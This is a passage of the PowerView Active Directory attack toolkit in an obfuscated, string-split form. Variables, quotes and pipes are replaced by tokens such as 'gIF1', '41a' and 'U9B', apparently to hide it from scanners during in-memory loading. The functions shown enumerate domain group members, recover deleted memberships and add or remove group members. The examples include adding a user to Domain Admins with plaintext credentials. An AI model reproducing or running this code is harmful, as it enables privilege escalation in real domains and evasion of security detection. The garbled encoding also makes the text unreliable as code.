        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        gIF1SearcherArguments = @{
            41aProperties41a = 41amember,samaccountname,distinguishedname41a
        }
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1SearcherArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aLDAPFilter41a]) { gIF1SearcherArguments[41aLDAPFilter41a] = gIF1LDAPFilter }
        if (gIF1PSBoundParameters['+'41aSearchBase41a]) { gIF1SearcherArguments[41aSearchBase41a] = gIF1SearchBase }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1SearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1SearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1SearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1SearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1SearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1SearcherArguments[41aCredential41a] = gIF1Credential }

        gIF1ADNameArguments = @{}
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1ADNameArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1ADNameArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1ADNameArguments[41aCredential41a] = gIF1Credential }
    }

    PROCESS {
        gIF1GroupSearcher = Get-DomainSearcher @SearcherArguments
        if (gIF1GroupSearcher) {
            if (gIF1PSBoundParameters[41aRecurseUsingMatchingRule41a]) {
                gIF1SearcherArguments[41aIdentity41a] = gIF1Identity
                gIF1SearcherArguments[41aRaw41a] = gIF1True
    '+'            gIF1Group = Get-DomainGroup @SearcherArguments

                if (-not gIF1Group) {
                    Write-Warning Zfr[Get-DomainGroupMember] Error searching for group with identity: gIF1IdentityZfr
                }
                else {
                    gIF1GroupFoundName = gIF1Group.properties.item(41asamaccountname41a)[0]
                    gIF1GroupFoundDN = gIF1Group.properties.item(41adistinguishedname41a)[0]

                    if (gIF1PSBoundParameters[41aDomain41a]) {
                        gIF1GroupFoundDomain = gIF1Domain
                    }
                    else {
                        # if a domain isn41at passed, try to extract it from the found group distinguished name
                        if (gIF1GroupFoundDN) {
                            gIF1GroupFoundDomain = gIF1GroupFoundDN.SubString(gIF1GroupFoundDN.IndexOf(41aDC=41a)) -replace 41aDC=41a,41a41a -replace 41a,41a,41a.41a
                        }
                    }
           '+'         Write-Verbose Zfr[Get-DomainGroupMember] Using LDAP matching rule to recurse on 41agIF1GroupFoundDN41a, only user accounts will be returned.Zfr
                    gIF1GroupSearcher.filter = Zfr(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=gIF1GroupFoundDN))Zfr
                    gIF1GroupSearcher.PropertiesToLoad.AddRange((41adistinguishedName41a))
                    gIF1Members = gIF1GroupSearcher.FindAll() U9B ForEach-Object {gIF1_.Properties.distinguishedname[0]}
                }
                gIF1Null = gIF1SearcherArguments.Remove(41aRaw41a)
            }
            else {
                gIF1IdentityFilter = 41a41a
                gIF1Filter = 41a41a
                gIF1Identity U9B Where-Object {gIF1_} U9B ForEach-Object {
                    gIF1IdentityInstance = gIF1_.Replace(41a(41a, 41aYwW2841a).Replace(41a)41a, 41aYwW2941a)
                    if (gIF1IdentityInstance -match 41a^S-1-41a) {
                        gIF1IdentityFilter += Zfr(objectsid=gIF1IdentityInstance)Zfr
                    }
                    elseif (gIF1IdentityInstance -match 41a^CN=41a) {
                        gIF1IdentityFilter += Zfr(distinguishedname=gIF1IdentityInstance)Zfr
                        if ((-not gIF1PSBoundParameters[41aDomain41a]) -and (-not gIF1PSBoundParameters[41aSearchBase41a])) {
                            # if a -Domain isn41at explicitly set, extract the object domain out of the distinguishedname
                            #   and rebuild the domain searcher
                            gIF1IdentityDomain = gIF1IdentityInstance.SubString(gIF1IdentityInstance.IndexOf(41aDC=41a)) -replace 41aDC=41a,41a41a -replace 41a,41a,41a.41a
                            Write-Verbose Zfr[Get-DomainGroupMember] Extracted domain 41agIF1IdentityDomain41a from 41agIF1IdentityInstance41aZfr
                            gIF1SearcherArguments[41aDomain41a] = gIF1IdentityDomain
                            gIF1GroupSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not gIF1GroupSearcher) {
                                Write-Warning Zfr[Get-DomainGroupMember] Unable to retrieve domain searcher for 41agIF1IdentityDomain41aZfr
                            }
                        }
                    }
                    elseif (gIF1IdentityInstance -imatch 41a^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}gIF141a) {
                        gIF1GuidByteString = (([Guid]gIF1IdentityInstance).ToByteArray() U9B ForEach-Object { 41aYwW41a + gIF1_.ToString(41aX241a) }) -join 41a41a
                        gIF1IdentityFilter += Zfr(objectguid=gIF1GuidByteString)Zfr
                    }
                    elseif (gIF1IdentityInstance.Contains(41aYwW41a)) {
                        gIF1ConvertedIdentityInstance = gIF1IdentityInstance.Replace(41aYwW2841a, 41a(41a).Replace(41aYwW2941a, 41a)41a) U9B Convert-ADName -OutputType Canonical
                        if (gIF1ConvertedIdentityInstance) {
                            gIF1GroupDomain = gIF1ConvertedIdentityInstance.SubString(0, gIF1ConvertedIdentityInstance.IndexOf(41a/41a))
                            gIF1GroupName = gIF1IdentityInstance.Split(41aYwW41a)[1]
                            gIF1IdentityFilter += Zfr(samAccountName=gIF1GroupName)Zfr
                            gIF1SearcherArguments[41aDomain41a] = gIF1GroupDomain
                            Write-Verbose Zfr[Get-DomainGroupMember] Extracted domain 41agIF1GroupDomain41a from 41agIF1IdentityInstance41aZfr
                            gIF1GroupSearcher = Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        gIF1IdentityFilter += Zfr(samAccountName=gIF1IdentityInstance)Zfr
                    }
                }

                if (gIF1IdentityFilter -and (gIF1IdentityFilter.Trim() -ne 41a41a) ) {
                    gIF1Filter += Zfr(U9BgIF1IdentityFilter)Zfr
                }

                if (gIF1PSBoundParameters[41aLDAPFilter41a]) {
                    Write-Verbose Zfr[Get-DomainGroupMember] Using additional LDAP filter: gIF1LDAPFilterZfr
                    gIF1Filter += ZfrgIF1LDAPFilterZfr
                }

                gIF1GroupSearcher.filter = Zfr(&(objectCategory=group)gIF1Filter)Zfr
                Write-Verbose Zfr[Get-DomainGroupMember] Get-DomainGroupMember filter string: gIF1(gIF1GroupSearcher.filter)Zf'+'r
                try {
                    gIF1Result = gIF1GroupSearcher.FindOne()
                }
                catch {
                    Write-Warning Zfr[Get-DomainGroupMember] Error searching for group with identity 41agIF1Identity41a: gIF1_Zfr
                    gIF1Members = @()
                }

                gIF1GroupFoundName = 41a41a
                gIF1GroupFoundDN = 41a41a

                if (gIF1Result) {
                    gIF1Members = gIF1Result.properties.item(41amember41a)

                    if (gIF1Members.count -eq 0) {
                        # ranged searching, thanks @meatballs__ !
                        gIF1Finished = gIF1False
                        gIF1Bottom = 0
                        gIF1Top = 0

                        while (-not gIF1Finished) {
                            gIF1Top = gIF1Bottom + 1499
                            gIF1MemberRange=Zfrmember;range=gIF1Bottom-gIF1TopZfr
                            gIF1Bottom += 1500
                            gIF1Null = gIF1GroupSearcher.PropertiesToLoad.Clear()
                            gIF1Null = gIF1GroupSearcher.PropertiesToLoad.Add(ZfrgIF1MemberRangeZfr)
                            gIF1Null = gIF1GroupSearch'+'er.PropertiesToLoad.Add(41asamaccountname41a)
                            gIF1Null = gIF1GroupSearcher.PropertiesToLoad.Add(41adistinguishedname41a)

                            try {
                                gIF1Result = gIF1GroupSearcher.FindOne()
                                gIF1RangedProperty = gIF1Result.Properties.PropertyNames -like Zfrmember;range=*Zfr
                                gIF1Members += gIF1Result.Properties.item(gIF1RangedProperty)
                                gIF1GroupFoundName = gIF1Result.properties.item(41asamaccountname41a)[0]
                                gIF1GroupFoundDN = gIF1Result.properties.item(41adistinguishedname41a)[0]

                                if (gIF1Members.count -eq 0) {
                                    gIF1Finished = gIF1True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
   '+'                             gIF1Finished = gIF1True
                            }
                        }
                    }
                    else {
                        gIF1GroupFoundName = gIF1Result.properties.item(41asamaccountname41a)[0]
                        gIF1GroupFoundDN = gIF1Result.properties.item(41adistinguishedname41a)[0]
                        gIF1Members += gIF1Result.Properties.item(gIF1RangedProperty)
                    }

                    if (gIF1PSBoundParameters[41aDomain41a]) {
                        gIF1GroupFoundDomain = gIF1Domain
                    }
                    else {
                        # if a domain isn41at passed, try to extract it from the found group distinguished name
                        if (gIF1GroupFoundDN) {
                            gIF1GroupFoundDomain = gIF1GroupFoundDN.SubString(gIF1GroupFoundDN.IndexOf(41aDC=41a)) -replace 41aDC=41a,41a41a -replace 41a,41a,41a.41a
                        }
                    }
                }
            }

            ForEach (gIF1Member in gIF1Members) {
                if (gIF1Recurse -and gIF1UseMatchingRule) {
                    gIF1Properties = gIF1_.Properties
                }
                else {
                    gIF1ObjectSearcherArguments = gIF1SearcherArguments.Clone()
                    gIF1ObjectSearcherArguments[41aIdentity41a] = gIF1Membe'+'r
                    gIF1ObjectSearcherArguments[41aRaw41a] = gIF1True
                    gIF1ObjectSearcherArguments[41aProperties41a] = 41adistinguishedname,cn,samaccountname,objectsid,objectclass41a
                    gIF1Object = Get-DomainObject @ObjectSearcherArguments
                    gIF1Properties = gIF1Object.Properties
                }

                if (gIF1Properties) {
                    gIF1GroupMember = New-Object PSObject
                    gIF1GroupMember U9B Add-Member Noteproperty 41aGroupDomain41a gIF1GroupFoundDomain
                    gIF1GroupMember U9B Add-Member Noteproperty 41aGroupName41a gIF1GroupFoundName
                    gIF1GroupMember U9B Add-Member Noteproperty 41aGroupDistinguishedName41a gIF1GroupFoundDN

                    if (gIF1Properties.objectsid) {
                        gIF1MemberSID = ((New-Object System.Security.Principal.SecurityIdentifier gIF1Properties.objectsid[0], 0).Value)
                    }
                    else {
                        gIF1MemberSID = gIF1Null
                    }

                    try {
                        gIF1MemberDN = gIF1Properties.distinguishedname[0]
                        if (gIF1MemberDN -match 41aForeignSecurityPrincipalsU9BS-1-5-2141a) {
                            try {
                                if (-not gIF1MemberSID) {
                                    gIF1MemberSID = gIF1Properties.cn[0]
                                }
                                gIF1MemberSimpleName = Convert-ADName -Identity gIF1MemberSID -OutputType 41aDomainSimple41a @ADNameArguments

                                if (gIF1MemberSimpleName) {
                                    gIF1MemberDomain = gIF1MemberSimpleName.Split(41a@41a)[1]
                                }
                                else {
                                    Write-Warning Zfr[Get-DomainGroupMember] Error converting gIF1MemberDNZfr
                                    gIF1MemberDomain = gIF1Null
                                }
                            }
                            catch {
                                Write-Warning Zfr[Get-DomainGroupMember] Error converting gIF1MemberDNZfr
                                gIF1MemberDomain = gIF1Null
                            }
                        }
                        else {
                            # extract the FQDN from the Distinguished Name
                            gIF1MemberDomain = gIF1MemberDN.SubString(gIF1MemberDN.IndexOf(41aDC=41a)) -replace 41aDC=41a,41a41a -replace 41a,41a,41a.41a
                        }
                    }
                    catch {
                        gIF1MemberDN = gIF1Null
                        gIF1MemberDomain = gIF1Null
                    }

                    if (gIF1Properties.samaccountname) {
                        # forest users have the samAccountName set
                        gIF1MemberName = gIF1Properties.samaccountname[0]
                    }
                    else {
                        # external trust users have a SID, so convert it
                        try {
                            gIF1MemberName = ConvertFrom-SID -ObjectSID gIF1Properties.cn[0] @ADNameArguments
                        }
                        catch {
                            # if there41as a problem contacting the domain to resolve the SID
                            gIF1MemberName = gIF1Properties.cn[0]
                        }
                    }

                    if (gIF1Properties.objectclass -match 41acomputer41a) {
                        gIF1MemberObjectClass = 41acomputer41a
                    }
                    elseif (gIF1Properties.objectclass -match 41agroup41a) {
                        gIF1MemberObjectClass = 41agroup41a
                    }
                    elseif (gIF1Properties.objectclass -match 41auser41a) {
                        gIF1MemberObjectClass = 41auser41a
                    }
                    else {
                        gIF1MemberObjectClass = gIF1Null
                    }
                    gIF1GroupMember U9B Add-Member Noteproperty 41aMemberDomain41a gIF1MemberDomain
                    gIF1GroupMember U9B Add-Member Noteproperty 41aMemberName41a gIF1MemberName
                    gIF1GroupMember U9B Add-Member Noteproperty 41aMemberDistinguishedName41a gIF1MemberDN
                    gIF1GroupMember U9B Add-Member Not'+'eproperty 41aMemberObjectClass41a gIF1MemberObjectClass
                    gIF1GroupMember U9B Add-Member Noteproperty 41aMemberSID41a gIF1MemberSID
                    gIF1GroupMember.PSObject.TypeNames.Insert(0, 41aPowerView.GroupMember41a)
                    gIF1GroupMember

                    # if we41are doing manual recursion
                    if (gIF1PSBoundParameters[41aRecurse41a] -and gIF1MemberDN -and (gIF1MemberObjectClass -match 41agroup41a)) {
                        Write-Verbose Zfr[Get-DomainGroupMember] Manually recursing on group: gIF1MemberDNZfr
                        gIF1SearcherArguments[41aIdentity41a] = gIF1MemberDN
                        gIF1Null = gIF1SearcherArguments.Remove(41aProperties41a)
                        Get-DomainGroupMember @SearcherArguments
                    }
                }
            }
            gIF1GroupSearcher.dispose()
        }
    }
}


function Get-DomainGroupMemberDeleted {
<#
.SYNOPSIS

Returns information on group members that were removed from the specified
group identity. Accomplished by searching the linked attribute replication
metadata for the group using Get-DomainObjectLinkedAttributeHistory.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObjectLinkedAttributeHistory

.DESCRIPTION

Wraps Get-DomainObjectLinkedAttributeHistory to return the linked attribute
replication metadata for the specified group. These are cases where the
41aVersion41a attribute of group member in the replication metadata is even.

.PARAMETER Identity
'+'
A SamAccountName (e.g. harmj'+'0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the t'+'arget domain.

.EXAMPLE

Get-DomainGroupMemberDeleted U9B Group-Object GroupDN

Count Name                      Group
----- ----                      -----
    2 CN=Domain Admins,CN=Us... {@{GroupDN=CN=Domain Admins,CN=Users,DC=test...
    3 CN=DomainLocalGroup,CN... {@{GroupDN=CN=DomainLocalGroup,CN=Users,DC=t...

.EXAMPLE

Get-DomainGroupMemberDeleted ZfrDomain AdminsZfr -Domain testlab.loca'+'l


GroupDN               : CN=Domain Admins,CN=Users,DC=testlab,DC=local
MemberDN              : CN=testuser,CN=Users,DC=testlab,DC=local
TimeFirstAdded        : 2017-06-13T23:07:43Z
TimeDeleted           : 2017-06-13T23:26:17Z
LastOriginatingChange : 2017-06-13T23:26:17Z
TimesAdded            : 2
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

GroupDN               : CN=Domain Admins,CN=Users,DC=testlab,DC=local
MemberDN              : CN=dfm,CN=Users,DC=testlab,DC=local
TimeFirstAdded        : 2017-06-13T22:20:02Z
TimeDeleted           : 2017-06-13T23:26:17Z
LastOriginatingChange : 2017-06-13T23:26:17Z
TimesAdded            : 5
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

.OUTPUTS

PowerView.DomainGroupMemberDeleted

Custom PSObject with translated replication metadata fields.

.LINK

https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-2-the-ephemeral-admin-or-how-to-track-the-group-membership/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSUseDeclaredVarsMoreThanAssignments41a, 41a41a)]
    [OutputType(41aPowerView.DomainGroupMemberDeleted41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aDistinguishedName41a, 41aSamAccountName41a, 41aName41a, 41aMemberDistinguishedName41a, 41aMemberName41a)]
        [String[]]
        gIF1Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aFilter41a)]
        [String]
        gIF1LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
       '+' [Int]
        gIF1ServerTimeLimit,

        [Switch]
        gIF1Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        gIF1Raw
    )

    BEGIN {
        gIF1SearcherArguments = @{
            41aProperties41a    =   41amsds-replvaluemetadata41a,41adistinguishedname41a
            41aRaw41a           =   gIF1True
            41aLDAPFilter41a   '+' =   41a(objectCategory=gr'+'oup)41a
        }
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1SearcherArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aLDAPFilter41a]) { gIF1SearcherArguments[41aLDAPFilter41a] = gIF1LDAPFilter }
        if (gIF1PSBoundParameters[41aSearchBase41a]) { gIF1SearcherArguments[41aSearchBase41a] = gIF1SearchBase }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1SearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1SearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1SearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1SearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1SearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1SearcherArguments[41aCredential41a] = gIF1Credential }
    }

    PROCESS {
        if (gIF1PSBoundParameters[41aIdentity41a]) { gIF1SearcherArguments[41aIdentity41a] = gIF1Identity }

        Get-DomainObject @SearcherArguments U9B ForEach-Object {
            gIF1ObjectDN = gIF1_.Properties[41adistinguishedname41a][0]
            ForEach(gIF1XMLNode in gIF1_.P'+'roperties[41amsds-replvaluemetadata41a]) {
                gIF1TempObject = [xml]gIF1XMLNode U9B Select-Object -ExpandProperty 41aDS_REPL_VALUE_META_DATA41a -ErrorAction SilentlyContinue
                if (gIF1TempObject) {
                    if ((gIF1TempObject.pszAttributeName -Match 41amember41a) -and ((gIF1TempObject.dwVersion % 2) -eq 0 )) {
                        gIF1Output = New-Object PSObject
                        gIF1Output U9B Add-Member NoteProperty 41aGroupDN41a gIF1ObjectDN
                        gIF1Output U9B Add-Member NoteProperty 41aMemberDN41a gIF1TempObject.pszObjectDn
                        gIF1Output U9B Add-Member NoteProperty 41aTimeFirstAdded41a gIF1TempObject.ftimeCreated
                        gIF1Output U9B Add-Member NoteProperty 41aTimeDeleted41a gIF1TempObject.ftimeDeleted
                        gIF1Output U9B Add-Member NoteProperty 41aLastOriginatingChange41a gIF1TempObject.ftimeLastOriginatingChange
                        gIF1Output U9B Add-Member NoteProperty 41aTimesAdded41a (gIF1TempObject.dwVersion / 2)
                        gIF1Output U9B Add-Member NoteProperty 41aLastOriginatingDsaDN41a gIF1TempObject.pszLastOriginatingDsaDN
                        gIF1Output.PSObject.TypeNames.Insert(0, 41aPowerView.DomainGroupMemberDeleted41a)
'+'                        gIF1Output
                    }
                }
                else {
                    Write-Verbose Zfr[Get-DomainGroupMemberDeleted] Error retrieving 41amsds-replvaluemetadata41a for 41agIF1ObjectDN41aZfr
                }
            }
        }
    }
}


function Add-DomainGroupMember {
<#
.SYNOPSIS

Adds a domain user (or group) to an existing domain group, assuming
appropriate permissions to do so.

Author: Will Schroeder (@'+'harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-PrincipalContext  

.DESCRIPTION

First binds to the specified domain context using Get-PrincipalContext.
The bound domain context is then used to search for the specified -GroupIdentity,
which returns a DirectoryServices.AccountManagement.GroupPrincipal object. For
each entry in -Members, ea'+'ch member identity is similarly searched for and added
to the group.

.PARAMETER Identity

A group SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the group to add members to.

.PARAMETER Members

One or more member identities, i.e. SamAccountName (e.g. Group1), DistinguishedName
(e.g. CN=group1,CN=Users,DC=testlab,DC=local), SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114),
or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202).

.PARAMETER Domain

Specifies the domain to use to search for user/group principals, defaults to the current dom'+'ain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Add-DomainGroupMember -Identity 41aDomain Admins41a -Members 41aharmj0y41a

Adds harmj0y to 41aDomain Admins41a in the current domain.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Add-DomainGroupMember -Identity 41aDomain Admins41a -Members 41aharmj0y41a -Credential gIF1Cred

Adds harmj0y to 41aDomain Admins41a in the current domain using the alternate credentials.

.EXAMPLE

gIF1SecPassword ='+' ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
gIF1UserPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
New-DomainUser -SamAccountName andy -AccountPassword gIF1UserPassword -Credential gIF1Cred U9B Add-DomainGroupMember 41aDomain Admins41a -Credential gIF1Cred

Creates the 41aandy41a user with the specified description and password, using the specified
alternate credentials, and adds the user to 41adomain admins41a using Add-DomainGroupMember
and the alternate crede'+'ntials.

.LINK

http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = gIF1True)]
        [Alias(41aGroupName41a, 41aGroupIdentity41a)]
        [String]
        gIF1Identity,

        [Parameter(Mandatory = gIF1True, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aMemberIdentity41a, 41aMember41a, 41aDistinguishedName41a)]
        [String[]]
        gIF1Members,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        gIF1ContextArguments = @{
            41aIdentity41a = gIF1Identity
        }
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1ContextArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1ContextArguments[41aCredential41a] = gIF1Credential }

        gIF1GroupContext = Get-PrincipalContext @ContextArguments

        if (gIF1GroupContext) {
            try {
                gIF1Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity(gIF1GroupContext.Context, gIF1GroupContext.Identity)
            }
            catch {
                Write-Warning Zfr[Add-DomainGroupMember] Error finding the group identity 41agIF1Identity41a : gIF1_Zfr
            }
        }
    }

    PROCESS {
        if (gIF1Group) {
            ForEach (gIF1Member in gIF1Members) {
                if (gIF1Member -match 41a.+YwWYwW.+41a) {
                    gIF1ContextArguments[41aIdentity41a] = gIF1Member
                    gIF1UserContext = Get-PrincipalContext @ContextArguments
                    if (gIF1UserContext) {
                        gIF1UserIdentity = gIF1UserContext.Identity
                    }
                }
                else {
                    gIF1UserContext = gIF1GroupContext
                    gIF1UserIdentity = gIF1Member
                }
                Write-Verbose Zfr[Add-DomainGroupMember] Adding member 41agIF1Member41a to group 41agIF1Identity41aZfr
                gIF1'+'Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity(gIF1UserContext.Context, gIF1UserIdentity)
                gIF1Group.Members.Add(gIF1Member)
                gIF1Group.Save()
            }
        }
    }
}


function Remove-DomainGroupMember {
<#
.SYNOPSIS

Removes a domain user (or group) from an existing domain group, assuming
appropriate permissions to do so.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-PrincipalContext  

.DESCRIPTION

First binds to the specified domain context using Get-PrincipalContext.
The bound domain context is then used to search for the specified -GroupIdentity,
which returns a DirectoryServices.AccountManagement.GroupPrincipal object. For
each entry in -Members, each member identity is similarly searched for and removed
from the group.

.PARAMETER Identity

A group SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the group to remove members from.

.PARAMETER Members

One or more member identities, i.e. SamAccountName (e.g. Group1), DistinguishedName
(e.g. CN=group1,CN=Users,DC=testlab,DC=local), SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114),
or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202).

.PARAMETER Domain

Specifies the domain to use to search for user/group principals, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Remove-DomainGroupMember -Identity 41aDomain Admins41a -Members 41aharmj0y41a

Removes harmj0y from 41aDomain Admins41a in the current domain.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Remove-DomainGroupMember -Identity 41aDomain Admins41a -Members 41aharmj0y41a -Credential gIF1Cred

Removes harmj0y from 41aDomain Admins41a in the current domain using the alternate credentials.

.LINK

http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = gIF1True)]
        [Alias(41aGroupName41a, 41aGroupIdentity41a)]
        [String]
        gIF1Identity,

        [Parameter(Mandatory = gIF1True, ValueFromPipeline = gIF'+'1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aMemberIdentity41a, 41aMember41a, 41aDistinguishedName41a)]
        [String[]]
        gIF1Members,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        gIF1ContextArguments = @{
            41aIdentity41a = gIF1Identity
        }
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1ContextArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1ContextArguments[41aCredential41a] = gIF1Credential }

        gIF1GroupContext = Get-PrincipalContext @ContextArguments

        if (gIF1GroupContext) {
            try {
                gIF1Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity(gIF1GroupContext.Context, gIF1GroupContext.Identity)
            }
            catch {
                Write-Warning Zfr[Remove-DomainGroupMember] Error finding the group identity 41agIF1Identity41a : gIF1_Zfr
            }
        }
    }

    PROCESS {
        if (gIF1Group) {
            ForEach (gIF1Member in gIF1Members) {
                if (gIF1Member -match 41a.+YwWYwW.+41a) {
                    gIF1ContextArguments[41aIdentity41a] = gIF1Member
                    gIF1UserContext = Get-PrincipalContext @ContextArguments
                    if (gIF1UserContext) {
                        gIF1UserIdentity = gIF1UserContext.Identity
                    }
                }
                else {
                    gIF1UserContext = gIF1GroupContext
                    gIF1UserIdentity = gIF1Member
                }
                Write-Verbose Zfr[Remove-DomainGroupMember] Removing member 41agIF1Member41a from group 41agIF1Identity41aZfr
                gIF1Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity(gIF1UserContext.Context, gIF1UserIdentity)
                gIF1Group.Members.Remove(gIF1Member)
                gIF1Group.Save()
            }
        }
    }
}


function Get-DomainFileServer {
<#
.SYNOPSIS

Returns a list of servers likely functioning as file servers.

Author: Will Schr'+'oeder (@harmj0y)  
